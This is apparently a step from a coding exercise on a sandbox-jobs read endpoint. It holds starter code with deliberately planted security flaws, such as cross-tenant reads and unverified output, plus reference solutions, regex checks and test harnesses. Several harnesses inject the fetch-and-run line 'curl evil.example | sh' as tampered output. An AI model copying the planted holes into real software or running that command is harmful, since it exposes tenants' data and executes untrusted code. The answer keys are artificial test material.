import type {Step} from '@/lib/types';

export const readStep: Step = {
  id: 'read',
  title: 'GET /v1/sandbox/jobs/{id}: results with provenance',
  concept: 'http',
  file: 'read',
  focus: ['client', 'api', 'redis'],
  task: `## Task

**Starting point.** The starter registers \`GET /v1/sandbox/jobs/{job_id}\` on the job store: it
loads the job with \`jobs.get\` (404 when there is none) and answers 200 with \`job_id\`, \`status\`,
\`exit_code\`, \`usage\`, the requested profile under \`profile\`, \`output_digest\` and the stored
output from \`jobs.read_output\`. It serves the demo and hides four flaws.

**Failure mode the checks target.** Any caller reads any tenant's job by guessing an id; a queued or
running job reads as a result; a job the node ran under \`kata\` when \`gvisor\` was asked for reports
\`gvisor\`; and output that was changed after the job wrote it is served as the job's output.

- The tenant is \`X-Tenant-Id\` (**401** without it). An unknown id and another tenant's job are both
  **404**: a 403 would confirm the id exists.
- Only a \`finished\` job has a result; a queued or running one is **409**.
- Report \`used_profile\`, the profile the container ran under, next to \`exit_code\` and \`usage\`
  (\`cpu_ms\`, \`mem_mb\`).
- Recompute \`jobs.digest(output)\` and compare it with the recorded \`output_digest\` before serving
  the output; on a mismatch answer **500** \`{"error": "DIGEST_MISMATCH"}\` and serve no output.`,
  sequence: {
    participants: ['Client', 'Sandbox API', 'job store'],
    messages: [
      {from: 'Client', to: 'Sandbox API', label: 'GET /v1/sandbox/jobs/{id} · X-Tenant-Id', kind: 'sync'},
      {from: 'Sandbox API', to: 'job store', label: 'get(id)', kind: 'sync'},
      {from: 'Sandbox API', to: 'Client', label: '404 unknown or foreign · 409 not finished', kind: 'reply'},
      {from: 'Sandbox API', to: 'job store', label: 'read_output(id)', kind: 'sync'},
      {from: 'Sandbox API', to: 'Sandbox API', label: 'digest(output) == output_digest?', kind: 'sync'},
      {
        from: 'Sandbox API',
        to: 'Client',
        label: '200 {exit_code, usage, used_profile, output} · 500 DIGEST_MISMATCH',
        kind: 'reply',
      },
    ],
  },
  checks: [
    {
      id: 'tenant-scope',
      title: 'Serves a job only to its tenant',
      detail:
        "No `X-Tenant-Id` is **401**; another tenant's job and an unknown id are both **404**, with nothing of the job in the body. The starter serves any job to anyone.",
      match: {
        python: {
          all: [/x-tenant-id/i, /\b401\b/, /\["tenant"\]\s*!=\s*tenant|tenant\s*!=\s*job\["tenant"\]/],
          none: [/\b403\b/],
        },
        typescript: {
          all: [/x-tenant-id/i, /\b401\b/, /\.tenant\s*!==?\s*tenant|tenant\s*!==?\s*job\.tenant/],
          none: [/\b403\b/],
        },
        go: {
          all: [/X-Tenant-Id/i, /StatusUnauthorized|\b401\b/, /\.Tenant\s*!=\s*tenant/],
          none: [/StatusForbidden|\b403\b/],
        },
        scala: {all: [/X-Tenant-Id/i, /Unauthorized/, /\.tenant\s*[!=]=\s*tenant/], none: [/Forbidden/]},
        cpp: {all: [/X-Tenant-Id/i, /\b401\b/, /(->|\.)tenant\s*!=\s*tenant/], none: [/\b403\b/]},
      },
    },
    {
      id: 'finished-only',
      title: 'Answers 409 for a job that has no result yet',
      detail:
        'A queued or running job is **409**; only a `finished` one answers 200 with its exit code. The starter answers 200 with a null exit code, which a client reads as a result.',
      match: {
        python: {all: [/["']finished["']/, /\b409\b/]},
        typescript: {all: [/['"]finished['"]/, /\b409\b/]},
        go: {all: [/"finished"/, /StatusConflict|\b409\b/]},
        scala: {all: [/"finished"/, /Conflict/]},
        cpp: {all: [/"finished"/, /\b409\b/]},
      },
    },
    {
      id: 'used-profile',
      title: 'Reports the profile the job ran under',
      detail:
        'The answer carries `used_profile` (kata for a gvisor request the node ran under kata), `exit_code` and `usage`; it does not present the requested profile as the one used. The starter reports the requested profile.',
      match: {
        python: {
          all: [/["']used_profile["']\s*:\s*job\[["']used_profile["']\]/],
          none: [/["']profile["']\s*:\s*job\[["']profile["']\]/],
        },
        typescript: {all: [/used_profile:\s*job\.used_profile/], none: [/\bprofile:\s*job\.profile/]},
        go: {all: [/"used_profile":\s*job\.UsedProfile/], none: [/"profile":\s*job\.Profile/]},
        scala: {all: [/"used_profile"\s*->/], none: [/"profile"\s*->\s*JsString\(job\.profile\)/]},
        cpp: {all: [/\{"used_profile",\s*job->used_profile\}/], none: [/\{"profile",\s*job->profile\}/]},
      },
    },
    {
      id: 'digest-verify',
      title: 'Verifies the output against its digest before serving it',
      detail:
        'The stored output is hashed and compared with `output_digest`; output changed after the job wrote it answers **500** `DIGEST_MISMATCH` and none of it. The starter serves whatever bytes the store holds.',
      match: {
        python: {all: [/jobs\.digest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
        typescript: {all: [/\bdigest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
        go: {all: [/jobs\.Digest\(/, /DIGEST_MISMATCH/, /StatusInternalServerError|\b500\b/]},
        scala: {all: [/Jobs\.digest\(/, /DIGEST_MISMATCH/, /InternalServerError/]},
        cpp: {all: [/jobs::digest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
      },
    },
  ],
  code: {
    python: {
      starter: `from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

from sandbox import jobs  # get, read_output, digest

app = FastAPI()


@app.get("/v1/sandbox/jobs/{job_id}")
def read_job(job_id: str, request: Request) -> JSONResponse:
    # TODO: this starter has four flaws. The task says where to look; the checks say what must change.
    job = jobs.get(job_id)
    if job is None:
        return JSONResponse({"error": "no such job"}, status_code=404)
    return JSONResponse({
        "job_id": job_id,
        "status": job["status"],
        "exit_code": job["exit_code"],
        "usage": {"cpu_ms": job["cpu_ms"], "mem_mb": job["mem_mb"]},
        "profile": job["profile"],
        "output_digest": job["output_digest"],
        "output": jobs.read_output(job_id),
    })
`,
      solution: `from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

from sandbox import jobs  # get, read_output, digest

app = FastAPI()


@app.get("/v1/sandbox/jobs/{job_id}")
def read_job(job_id: str, request: Request) -> JSONResponse:
    tenant = request.headers.get("x-tenant-id", "")
    if not tenant:
        return JSONResponse({"error": "X-Tenant-Id is required"}, status_code=401)
    job = jobs.get(job_id)
    if job is None or job["tenant"] != tenant:
        return JSONResponse({"error": "no such job"}, status_code=404)  # a 403 would confirm the id exists
    if job["status"] != "finished":
        return JSONResponse({"error": "the job has no result yet", "status": job["status"]}, status_code=409)
    output = jobs.read_output(job_id)
    if output is None or jobs.digest(output) != job["output_digest"]:
        # The bytes are not the ones the job produced: serve none of them.
        return JSONResponse({"error": "DIGEST_MISMATCH"}, status_code=500)
    return JSONResponse({
        "job_id": job_id,
        "status": job["status"],
        "exit_code": job["exit_code"],
        "usage": {"cpu_ms": job["cpu_ms"], "mem_mb": job["mem_mb"]},
        "used_profile": job["used_profile"],
        "output_digest": job["output_digest"],
        "output": output,
    })
`,
    },
    typescript: {
      starter: `import Fastify from 'fastify';

import {digest, get, readOutput} from 'sandbox/jobs';

export const app = Fastify();

app.get('/v1/sandbox/jobs/:jobId', async (request, reply) => {
  // TODO: this starter has four flaws. The task says where to look; the checks say what must change.
  const {jobId} = request.params as {jobId: string};
  const job = await get(jobId);
  if (job === null) return reply.code(404).send({error: 'no such job'});
  return {
    job_id: jobId,
    status: job.status,
    exit_code: job.exit_code,
    usage: {cpu_ms: job.cpu_ms, mem_mb: job.mem_mb},
    profile: job.profile,
    output_digest: job.output_digest,
    output: await readOutput(jobId),
  };
});
`,
      solution: `import Fastify from 'fastify';

import {digest, get, readOutput} from 'sandbox/jobs';

export const app = Fastify();

app.get('/v1/sandbox/jobs/:jobId', async (request, reply) => {
  const tenant = request.headers['x-tenant-id'];
  if (typeof tenant !== 'string' || tenant === '') return reply.code(401).send({error: 'X-Tenant-Id is required'});
  const {jobId} = request.params as {jobId: string};
  const job = await get(jobId);
  // A 403 would confirm the id exists.
  if (job === null || job.tenant !== tenant) return reply.code(404).send({error: 'no such job'});
  if (job.status !== 'finished') return reply.code(409).send({error: 'the job has no result yet', status: job.status});
  const output = await readOutput(jobId);
  // The bytes are not the ones the job produced: serve none of them.
  if (output === null || digest(output) !== job.output_digest) return reply.code(500).send({error: 'DIGEST_MISMATCH'});
  return {
    job_id: jobId,
    status: job.status,
    exit_code: job.exit_code,
    usage: {cpu_ms: job.cpu_ms, mem_mb: job.mem_mb},
    used_profile: job.used_profile,
    output_digest: job.output_digest,
    output,
  };
});
`,
    },
    go: {
      starter: `package main

import (
	"encoding/json"
	"net/http"

	"sandbox/jobs" // jobs.Get, ReadOutput, Digest
)

func writeJSON(rw http.ResponseWriter, status int, v any) {
	rw.Header().Set("Content-Type", "application/json")
	rw.WriteHeader(status)
	json.NewEncoder(rw).Encode(v)
}

func readJob(rw http.ResponseWriter, r *http.Request) {
	// TODO: this starter has four flaws. The task says where to look; the checks say what must change.
	jobID := r.PathValue("id")
	job := jobs.Get(r.Context(), jobID)
	if job == nil {
		writeJSON(rw, http.StatusNotFound, map[string]string{"error": "no such job"})
		return
	}
	output, _ := jobs.ReadOutput(r.Context(), jobID)
	writeJSON(rw, http.StatusOK, map[string]any{
		"job_id":        jobID,
		"status":        job.Status,
		"exit_code":     job.ExitCode,
		"usage":         map[string]int{"cpu_ms": job.CPUMs, "mem_mb": job.MemMB},
		"profile":       job.Profile,
		"output_digest": job.OutputDigest,
		"output":        output,
	})
}

func register(mux *http.ServeMux) {
	mux.HandleFunc("GET /v1/sandbox/jobs/{id}", readJob)
}
`,
      solution: `package main

import (
	"encoding/json"
	"net/http"

	"sandbox/jobs" // jobs.Get, ReadOutput, Digest
)

func writeJSON(rw http.ResponseWriter, status int, v any) {
	rw.Header().Set("Content-Type", "application/json")
	rw.WriteHeader(status)
	json.NewEncoder(rw).Encode(v)
}

func readJob(rw http.ResponseWriter, r *http.Request) {
	tenant := r.Header.Get("X-Tenant-Id")
	if tenant == "" {
		writeJSON(rw, http.StatusUnauthorized, map[string]string{"error": "X-Tenant-Id is required"})
		return
	}
	jobID := r.PathValue("id")
	job := jobs.Get(r.Context(), jobID)
	if job == nil || job.Tenant != tenant {
		writeJSON(rw, http.StatusNotFound, map[string]string{"error": "no such job"}) // a 403 would confirm the id exists
		return
	}
	if job.Status != "finished" {
		writeJSON(rw, http.StatusConflict, map[string]string{"error": "the job has no result yet", "status": job.Status})
		return
	}
	output, stored := jobs.ReadOutput(r.Context(), jobID)
	if !stored || jobs.Digest(output) != job.OutputDigest {
		// The bytes are not the ones the job produced: serve none of them.
		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "DIGEST_MISMATCH"})
		return
	}
	writeJSON(rw, http.StatusOK, map[string]any{
		"job_id":        jobID,
		"status":        job.Status,
		"exit_code":     job.ExitCode,
		"usage":         map[string]int{"cpu_ms": job.CPUMs, "mem_mb": job.MemMB},
		"used_profile":  job.UsedProfile,
		"output_digest": job.OutputDigest,
		"output":        output,
	})
}

func register(mux *http.ServeMux) {
	mux.HandleFunc("GET /v1/sandbox/jobs/{id}", readJob)
}
`,
    },
    scala: {
      starter: `import org.apache.pekko.http.scaladsl.model.{ContentTypes, HttpEntity, HttpResponse, StatusCode, StatusCodes}
import org.apache.pekko.http.scaladsl.server.Directives._
import org.apache.pekko.http.scaladsl.server.Route
import spray.json._

import sandbox.Jobs // Jobs.get, readOutput, digest

object JobRead {
  private def json(status: StatusCode, body: JsObject): HttpResponse =
    HttpResponse(status, entity = HttpEntity(ContentTypes.\`application/json\`, body.compactPrint))

  private def number(n: Option[Long]): JsValue = n.map(JsNumber(_)).getOrElse(JsNull)

  val route: Route = path("v1" / "sandbox" / "jobs" / Segment) { jobId =>
    get {
      // TODO: this starter has four flaws. The task says where to look; the checks say what must change.
      Jobs.get(jobId) match {
        case None => complete(json(StatusCodes.NotFound, JsObject("error" -> JsString("no such job"))))
        case Some(job) =>
          complete(
            json(
              StatusCodes.OK,
              JsObject(
                "job_id" -> JsString(jobId),
                "status" -> JsString(job.status),
                "exit_code" -> number(job.exitCode),
                "usage" -> JsObject("cpu_ms" -> number(job.cpuMs), "mem_mb" -> number(job.memMb)),
                "profile" -> JsString(job.profile),
                "output_digest" -> job.outputDigest.map(JsString(_)).getOrElse(JsNull),
                "output" -> Jobs.readOutput(jobId).map(JsString(_)).getOrElse(JsNull),
              ),
            ),
          )
      }
    }
  }
}
`,
      solution: `import org.apache.pekko.http.scaladsl.model.{ContentTypes, HttpEntity, HttpResponse, StatusCode, StatusCodes}
import org.apache.pekko.http.scaladsl.server.Directives._
import org.apache.pekko.http.scaladsl.server.Route
import spray.json._

import sandbox.Jobs // Jobs.get, readOutput, digest

object JobRead {
  private def json(status: StatusCode, body: JsObject): HttpResponse =
    HttpResponse(status, entity = HttpEntity(ContentTypes.\`application/json\`, body.compactPrint))

  private def error(status: StatusCode, message: String): HttpResponse = json(status, JsObject("error" -> JsString(message)))

  private def number(n: Option[Long]): JsValue = n.map(JsNumber(_)).getOrElse(JsNull)

  private def read(tenant: String, jobId: String): HttpResponse =
    Jobs.get(jobId).filter(_.tenant == tenant) match {
      case None => error(StatusCodes.NotFound, "no such job") // a 403 would confirm the id exists
      case Some(job) if job.status != "finished" => error(StatusCodes.Conflict, "the job has no result yet")
      case Some(job) =>
        Jobs.readOutput(jobId).filter(output => job.outputDigest.contains(Jobs.digest(output))) match {
          // The bytes are not the ones the job produced: serve none of them.
          case None => error(StatusCodes.InternalServerError, "DIGEST_MISMATCH")
          case Some(output) =>
            json(
              StatusCodes.OK,
              JsObject(
                "job_id" -> JsString(jobId),
                "status" -> JsString(job.status),
                "exit_code" -> number(job.exitCode),
                "usage" -> JsObject("cpu_ms" -> number(job.cpuMs), "mem_mb" -> number(job.memMb)),
                "used_profile" -> job.usedProfile.map(JsString(_)).getOrElse(JsNull),
                "output_digest" -> job.outputDigest.map(JsString(_)).getOrElse(JsNull),
                "output" -> JsString(output),
              ),
            )
        }
    }

  val route: Route = path("v1" / "sandbox" / "jobs" / Segment) { jobId =>
    get {
      optionalHeaderValueByName("X-Tenant-Id") {
        case None | Some("") => complete(error(StatusCodes.Unauthorized, "X-Tenant-Id is required"))
        case Some(tenant) => complete(read(tenant, jobId))
      }
    }
  }
}
`,
    },
    cpp: {
      starter: `#include <httplib.h>
#include <nlohmann/json.hpp>

#include <string>

#include "sandbox/jobs.h"  // jobs::get, readOutput, digest

using json = nlohmann::json;

void read_job(const httplib::Request& req, httplib::Response& res) {
  // TODO: this starter has four flaws. The task says where to look; the checks say what must change.
  const std::string job_id = req.matches[1];
  const auto job = jobs::get(job_id);
  if (!job) {
    res.status = 404;
    res.set_content(json{{"error", "no such job"}}.dump(), "application/json");
    return;
  }
  res.set_content(json{{"job_id", job_id},
                       {"status", job->status},
                       {"exit_code", job->exit_code},
                       {"usage", json{{"cpu_ms", job->cpu_ms}, {"mem_mb", job->mem_mb}}},
                       {"profile", job->profile},
                       {"output_digest", job->output_digest},
                       {"output", jobs::readOutput(job_id).value_or("")}}
                      .dump(),
                  "application/json");
}

void register_routes(httplib::Server& svr) { svr.Get(R"(/v1/sandbox/jobs/([\\w-]+))", read_job); }
`,
      solution: `#include <httplib.h>
#include <nlohmann/json.hpp>

#include <string>

#include "sandbox/jobs.h"  // jobs::get, readOutput, digest

using json = nlohmann::json;

void fail(httplib::Response& res, int status, const json& body) {
  res.status = status;
  res.set_content(body.dump(), "application/json");
}

void read_job(const httplib::Request& req, httplib::Response& res) {
  const std::string tenant = req.get_header_value("X-Tenant-Id");
  if (tenant.empty()) return fail(res, 401, json{{"error", "X-Tenant-Id is required"}});
  const std::string job_id = req.matches[1];
  const auto job = jobs::get(job_id);
  // A 403 would confirm the id exists.
  if (!job || job->tenant != tenant) return fail(res, 404, json{{"error", "no such job"}});
  if (job->status != "finished") return fail(res, 409, json{{"error", "the job has no result yet"}, {"status", job->status}});
  const auto output = jobs::readOutput(job_id);
  // The bytes are not the ones the job produced: serve none of them.
  if (!output || jobs::digest(*output) != job->output_digest) return fail(res, 500, json{{"error", "DIGEST_MISMATCH"}});
  res.set_content(json{{"job_id", job_id},
                       {"status", job->status},
                       {"exit_code", job->exit_code},
                       {"usage", json{{"cpu_ms", job->cpu_ms}, {"mem_mb", job->mem_mb}}},
                       {"used_profile", job->used_profile},
                       {"output_digest", job->output_digest},
                       {"output", *output}}
                      .dump(),
                  "application/json");
}

void register_routes(httplib::Server& svr) { svr.Get(R"(/v1/sandbox/jobs/([\\w-]+))", read_job); }
`,
    },
  },
  harness: {
    python: `from sandbox import jobs

OUTPUT = "hello from the sandbox\\n"


def _job(tenant="t1", profile="gvisor", used="kata", status="finished"):
    job_id = jobs.create(tenant, profile, [], "print('hello from the sandbox')")["job_id"]
    if status in ("running", "finished"):
        jobs.mark_running(job_id, used)
    if status == "finished":
        jobs.put_result(job_id, 0, OUTPUT, 120, 64)
    return job_id


def _api(ctx):
    return ctx.client(ctx.load("read").app)


async def _read(c, job_id, tenant="t1"):
    return await c.get(f"/v1/sandbox/jobs/{job_id}", headers={"X-Tenant-Id": tenant} if tenant else {})


async def check_tenant_scope(ctx):
    job_id = _job("t1")
    async with _api(ctx) as c:
        r = await _read(c, job_id, tenant=None)
        assert r.status_code == 401, f"a read without X-Tenant-Id answered {r.status_code}, expected 401"
        r = await _read(c, job_id, tenant="t2")
        assert r.status_code == 404, f"tenant t2 reading t1's job answered {r.status_code}, expected 404 (a 403 would confirm the id exists)"
        assert OUTPUT.strip() not in r.text, f"the refusal carries t1's output: {r.text}"
        r = await _read(c, "j-999")
        assert r.status_code == 404, f"an unknown job answered {r.status_code}, expected 404"
        r = await _read(c, job_id)
    assert r.status_code == 200, f"t1 reading its own finished job answered {r.status_code}: {r.text}"


async def check_finished_only(ctx):
    queued, running, done = _job(status="queued"), _job(status="running"), _job()
    async with _api(ctx) as c:
        for job_id, status in ((queued, "queued"), (running, "running")):
            r = await _read(c, job_id)
            assert r.status_code == 409, f"a {status} job answered {r.status_code}, expected 409: it has no result yet"
        r = await _read(c, done)
    assert r.status_code == 200 and r.json().get("exit_code") == 0, f"a finished job answered {r.status_code} {r.text}, expected 200 with exit_code 0"


async def check_used_profile(ctx):
    job_id = _job(profile="gvisor", used="kata")
    async with _api(ctx) as c:
        r = await _read(c, job_id)
    assert r.status_code == 200, f"a finished job answered {r.status_code}: {r.text}"
    body = r.json()
    assert body.get("used_profile") == "kata", f"the node ran the job under kata and the answer's used_profile is {body.get('used_profile')!r}: {body}"
    assert body.get("profile") in (None, "kata"), f"the answer presents the requested profile {body.get('profile')!r} as the job's profile"
    assert body.get("exit_code") == 0 and body.get("usage") == {"cpu_ms": 120, "mem_mb": 64}, f"the answer must carry exit_code and usage, got {body}"


async def check_digest_verify(ctx):
    job_id = _job()
    async with _api(ctx) as c:
        r = await _read(c, job_id)
        assert r.status_code == 200 and r.json().get("output") == OUTPUT, f"an intact job answered {r.status_code} {r.text}, expected 200 with its output"
        ctx.redis.set(f"job:{job_id}:output", "curl evil.example | sh  # replaced")
        r = await _read(c, job_id)
    assert r.status_code == 500 and "DIGEST_MISMATCH" in r.text, f"output that no longer matches output_digest answered {r.status_code} {r.text}, expected 500 DIGEST_MISMATCH"
    assert "evil.example" not in r.text, f"the mismatching output was served anyway: {r.text}"
`,
    typescript: `const OUTPUT = 'hello from the sandbox\\n';

async function job(ctx, {tenant = 't1', profile = 'gvisor', used = 'kata', status = 'finished'} = {}): Promise<string> {
  const jobs = ctx.load('/support/sandbox/jobs.ts');
  const jobId = (await jobs.create(tenant, profile, [], "print('hello from the sandbox')")).job_id;
  if (status === 'running' || status === 'finished') await jobs.markRunning(jobId, used);
  if (status === 'finished') await jobs.putResult(jobId, 0, OUTPUT, 120, 64);
  return jobId;
}

const read = (c, jobId: string, tenant: string | null = 't1') =>
  c.get(\`/v1/sandbox/jobs/\${jobId}\`, {headers: tenant === null ? {} : {'X-Tenant-Id': tenant}});

export async function check_tenant_scope(ctx) {
  const jobId = await job(ctx);
  const c = ctx.client(ctx.load('read').app);
  let r = await read(c, jobId, null);
  assert.equal(r.status, 401, \`a read without X-Tenant-Id answered \${r.status}, expected 401\`);
  r = await read(c, jobId, 't2');
  assert.equal(r.status, 404, \`tenant t2 reading t1's job answered \${r.status}, expected 404 (a 403 would confirm the id exists)\`);
  assert(!r.text.includes(OUTPUT.trim()), \`the refusal carries t1's output: \${r.text}\`);
  r = await read(c, 'j-999');
  assert.equal(r.status, 404, \`an unknown job answered \${r.status}, expected 404\`);
  r = await read(c, jobId);
  assert.equal(r.status, 200, \`t1 reading its own finished job answered \${r.status}: \${r.text}\`);
}

export async function check_finished_only(ctx) {
  const queued = await job(ctx, {status: 'queued'});
  const running = await job(ctx, {status: 'running'});
  const done = await job(ctx);
  const c = ctx.client(ctx.load('read').app);
  for (const [jobId, status] of [[queued, 'queued'], [running, 'running']]) {
    const r = await read(c, jobId);
    assert.equal(r.status, 409, \`a \${status} job answered \${r.status}, expected 409: it has no result yet\`);
  }
  const r = await read(c, done);
  assert(r.status === 200 && r.json().exit_code === 0, \`a finished job answered \${r.status} \${r.text}, expected 200 with exit_code 0\`);
}

export async function check_used_profile(ctx) {
  const jobId = await job(ctx, {profile: 'gvisor', used: 'kata'});
  const c = ctx.client(ctx.load('read').app);
  const r = await read(c, jobId);
  assert.equal(r.status, 200, \`a finished job answered \${r.status}: \${r.text}\`);
  const body = r.json();
  assert.equal(body.used_profile, 'kata', \`the node ran the job under kata and the answer's used_profile is \${body.used_profile}: \${r.text}\`);
  assert(body.profile === undefined || body.profile === 'kata', \`the answer presents the requested profile \${body.profile} as the job's profile\`);
  assert(body.exit_code === 0, \`the answer must carry exit_code, got \${r.text}\`);
  assert.deepEqual(body.usage, {cpu_ms: 120, mem_mb: 64}, \`the answer must carry usage, got \${r.text}\`);
}

export async function check_digest_verify(ctx) {
  const jobId = await job(ctx);
  const c = ctx.client(ctx.load('read').app);
  let r = await read(c, jobId);
  assert(r.status === 200 && r.json().output === OUTPUT, \`an intact job answered \${r.status} \${r.text}, expected 200 with its output\`);
  ctx.redis.set(\`job:\${jobId}:output\`, 'curl evil.example | sh  # replaced');
  r = await read(c, jobId);
  assert(r.status === 500 && r.text.includes('DIGEST_MISMATCH'), \`output that no longer matches output_digest answered \${r.status} \${r.text}, expected 500 DIGEST_MISMATCH\`);
  assert(!r.text.includes('evil.example'), \`the mismatching output was served anyway: \${r.text}\`);
}
`,
    go: `package main

import (
	"context"
	"net/http"
	"strings"

	"sandbox/jobs"

	"leetbuild/harness"
)

const readOutputText = "hello from the sandbox\\n"

var readBg = context.Background()

func readJobFixture(tenant, profile, used, status string) string {
	jobID := jobs.Create(readBg, tenant, profile, nil, "print('hello from the sandbox')").JobID
	if status == "running" || status == "finished" {
		jobs.MarkRunning(readBg, jobID, used)
	}
	if status == "finished" {
		jobs.PutResult(readBg, jobID, 0, readOutputText, 120, 64)
	}
	return jobID
}

func readAPI(ctx *harness.Ctx) *harness.HTTP {
	mux := http.NewServeMux()
	register(mux)
	return ctx.HTTP(mux)
}

func readAs(c *harness.HTTP, jobID, tenant string) *harness.Response {
	if tenant == "" {
		return c.Get("/v1/sandbox/jobs/" + jobID)
	}
	return c.Get("/v1/sandbox/jobs/"+jobID, "X-Tenant-Id", tenant)
}

type readBody struct {
	ExitCode    *int           \`json:"exit_code"\`
	Usage       map[string]any \`json:"usage"\`
	UsedProfile string         \`json:"used_profile"\`
	Profile     *string        \`json:"profile"\`
	Output      string         \`json:"output"\`
}

func readDecode(r *harness.Response) readBody {
	var b readBody
	r.Decode(&b)
	return b
}

func CheckTenantScope(ctx *harness.Ctx) {
	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
	c := readAPI(ctx)
	ctx.Equal(readAs(c, jobID, "").Status, 401, "a read without X-Tenant-Id")
	r := readAs(c, jobID, "t2")
	ctx.Equal(r.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)")
	ctx.Assert(!strings.Contains(r.Text(), "hello from the sandbox"), "the refusal carries t1's output: %s", r.Text())
	ctx.Equal(readAs(c, "j-999", "t1").Status, 404, "an unknown job")
	r = readAs(c, jobID, "t1")
	ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text())
}

func CheckFinishedOnly(ctx *harness.Ctx) {
	queued := readJobFixture("t1", "gvisor", "kata", "queued")
	running := readJobFixture("t1", "gvisor", "kata", "running")
	done := readJobFixture("t1", "gvisor", "kata", "finished")
	c := readAPI(ctx)
	ctx.Equal(readAs(c, queued, "t1").Status, 409, "a queued job has no result yet")
	ctx.Equal(readAs(c, running, "t1").Status, 409, "a running job has no result yet")
	r := readAs(c, done, "t1")
	body := readDecode(r)
	ctx.Assert(r.Status == 200 && body.ExitCode != nil && *body.ExitCode == 0, "a finished job answered %d %s, expected 200 with exit_code 0", r.Status, r.Text())
}

func CheckUsedProfile(ctx *harness.Ctx) {
	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
	r := readAs(readAPI(ctx), jobID, "t1")
	ctx.Equal(r.Status, 200, "a finished job (%s)", r.Text())
	body := readDecode(r)
	ctx.Equal(body.UsedProfile, "kata", "the node ran the job under kata; the answer's used_profile")
	ctx.Assert(body.Profile == nil || *body.Profile == "kata", "the answer presents the requested profile %q as the job's profile", r.Text())
	ctx.Assert(body.ExitCode != nil && *body.ExitCode == 0, "the answer must carry exit_code, got %s", r.Text())
	ctx.Equal(body.Usage, map[string]any{"cpu_ms": 120, "mem_mb": 64}, "the answer's usage")
}

func CheckDigestVerify(ctx *harness.Ctx) {
	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
	c := readAPI(ctx)
	r := readAs(c, jobID, "t1")
	ctx.Assert(r.Status == 200 && readDecode(r).Output == readOutputText, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text())
	ctx.Redis.Set("job:"+jobID+":output", "curl evil.example | sh  # replaced")
	r = readAs(c, jobID, "t1")
	ctx.Assert(r.Status == 500 && strings.Contains(r.Text(), "DIGEST_MISMATCH"), "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text())
	ctx.Assert(!strings.Contains(r.Text(), "evil.example"), "the mismatching output was served anyway: %s", r.Text())
}
`,
    cpp: `#include <leetbuild/harness.h>

#include <nlohmann/json.hpp>

#include <string>

#include "sandbox/jobs.h"

namespace {

const std::string kReadOutput = "hello from the sandbox\\n";

std::string readJobFixture(const std::string& tenant, const std::string& status, const std::string& used = "kata") {
  const std::string job_id = jobs::create(tenant, "gvisor", {}, "print('hello from the sandbox')").job_id;
  if (status == "running" || status == "finished") jobs::markRunning(job_id, used);
  if (status == "finished") jobs::putResult(job_id, 0, kReadOutput, 120, 64);
  return job_id;
}

harness::HTTP readAPI(harness::Ctx& ctx) {
  static httplib::Server* svr = nullptr;
  delete svr;
  svr = new httplib::Server;
  register_routes(*svr);
  return ctx.HTTP(*svr);
}

harness::Response readAs(harness::HTTP& c, const std::string& job_id, const std::string& tenant) {
  if (tenant.empty()) return c.Get("/v1/sandbox/jobs/" + job_id);
  return c.Get("/v1/sandbox/jobs/" + job_id, "X-Tenant-Id", tenant);
}

nlohmann::json bodyOf(const harness::Response& r) { return nlohmann::json::parse(r.Text(), nullptr, false); }

}  // namespace

void CheckTenantScope(harness::Ctx& ctx) {
  const std::string job_id = readJobFixture("t1", "finished");
  auto c = readAPI(ctx);
  ctx.Equal(readAs(c, job_id, "").Status, 401, "a read without X-Tenant-Id");
  auto r = readAs(c, job_id, "t2");
  ctx.Equal(r.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)");
  ctx.Assert(r.Text().find("hello from the sandbox") == std::string::npos, "the refusal carries t1's output: %s", r.Text());
  ctx.Equal(readAs(c, "j-999", "t1").Status, 404, "an unknown job");
  r = readAs(c, job_id, "t1");
  ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text());
}

void CheckFinishedOnly(harness::Ctx& ctx) {
  const std::string queued = readJobFixture("t1", "queued");
  const std::string running = readJobFixture("t1", "running");
  const std::string done = readJobFixture("t1", "finished");
  auto c = readAPI(ctx);
  ctx.Equal(readAs(c, queued, "t1").Status, 409, "a queued job has no result yet");
  ctx.Equal(readAs(c, running, "t1").Status, 409, "a running job has no result yet");
  const auto r = readAs(c, done, "t1");
  const auto body = bodyOf(r);
  ctx.Assert(r.Status == 200 && body.is_object() && body.value("exit_code", -1) == 0, "a finished job answered %d %s, expected 200 with exit_code 0", r.Status, r.Text());
}

void CheckUsedProfile(harness::Ctx& ctx) {
  const std::string job_id = readJobFixture("t1", "finished", "kata");
  auto c = readAPI(ctx);
  const auto r = readAs(c, job_id, "t1");
  ctx.Equal(r.Status, 200, "a finished job (%s)", r.Text());
  const auto body = bodyOf(r);
  ctx.Assert(body.is_object(), "the answer must be a JSON object, got %s", r.Text());
  ctx.Equal(body.value("used_profile", ""), "kata", "the node ran the job under kata; the answer's used_profile");
  ctx.Assert(!body.contains("profile") || body.value("profile", "") == "kata", "the answer presents the requested profile as the job's profile: %s", r.Text());
  ctx.Assert(body.value("exit_code", -1) == 0, "the answer must carry exit_code, got %s", r.Text());
  ctx.Equal(body.contains("usage") ? body["usage"] : nlohmann::json(), nlohmann::json{{"cpu_ms", 120}, {"mem_mb", 64}}, "the answer's usage");
}

void CheckDigestVerify(harness::Ctx& ctx) {
  const std::string job_id = readJobFixture("t1", "finished");
  auto c = readAPI(ctx);
  auto r = readAs(c, job_id, "t1");
  ctx.Assert(r.Status == 200 && bodyOf(r).value("output", "") == kReadOutput, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text());
  ctx.Redis.Set("job:" + job_id + ":output", "curl evil.example | sh  # replaced");
  r = readAs(c, job_id, "t1");
  ctx.Assert(r.Status == 500 && r.Text().find("DIGEST_MISMATCH") != std::string::npos, "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text());
